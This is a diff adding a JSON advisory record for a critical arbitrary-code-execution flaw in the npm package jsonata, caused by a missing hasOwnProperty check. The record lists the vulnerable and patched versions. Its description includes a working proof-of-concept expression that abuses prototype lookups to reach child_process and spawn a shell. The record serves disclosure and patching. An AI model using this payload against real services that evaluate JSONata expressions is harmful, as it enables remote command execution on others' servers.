@@ -1,0 +1,71 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-08-21T20:57:09Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "jsonata"
+  },
+  "Advisory": {
+    "DatabaseId": 413985,
+    "Id": "GSA_kwCzR0hTQS04Z3EzLXZwNWotMmdycM4ABlEh",
+    "GhsaId": "GHSA-8gq3-vp5j-2grp",
+    "References": [
+      {
+        "Url": "https://github.com/jsonata-js/jsonata/security/advisories/GHSA-8gq3-vp5j-2grp"
+      },
+      {
+        "Url": "https://github.com/jsonata-js/jsonata/pull/794"
+      },
+      {
+        "Url": "https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e"
+      },
+      {
+        "Url": "https://github.com/jsonata-js/jsonata/commit/4c5f4adfb90a9b500889d50f90050ca68888b50d"
+      },
+      {
+        "Url": "https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8"
+      },
+      {
+        "Url": "https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-8gq3-vp5j-2grp"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-8gq3-vp5j-2grp"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-77413"
+      }
+    ],
+    "Description": "## Impact\n\nBefore JSONata `2.2.0` and `1.8.8` it was possible to execute arbitrary code with crafted expressions, due to a missing `hasOwnProperty` check in the `lookup` function:\nhttps://github.com/jsonata-js/jsonata/blob/f9632e01e6e67d4f9f00593f9795420cb4b57f48/src/functions.js#L1686-L1705\n\nThis was fixed with https://github.com/jsonata-js/jsonata/pull/794, which is included in the `2.2.0` release, and ported in the `1.8.8` release.\n\n## PoC\n\n```js\nimport jsonata from \"jsonata\";\n\nconst expression = jsonata(`\n(\n   __lookupSetter__('__proto__')(constructor);\n   __defineGetter__('l', constructor(\"return\nprocess.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'}).toString()\"));\n   valueOf().l\n)\n`);\n\nawait expression.evaluate({});\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-08-21T20:57:07Z",
+    "Severity": "CRITICAL",
+    "Summary": "JSONata: Arbitrary Code Execution via crafted JSONata expressions",
+    "UpdatedAt": "2026-08-21T20:57:09Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.2.0"
+      },
+      "VulnerableVersionRange": "\u003e= 2.0.0, \u003c 2.2.0"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.8.8"
+      },
+      "VulnerableVersionRange": "\u003c= 1.8.7"
+    }
+  ]
+}
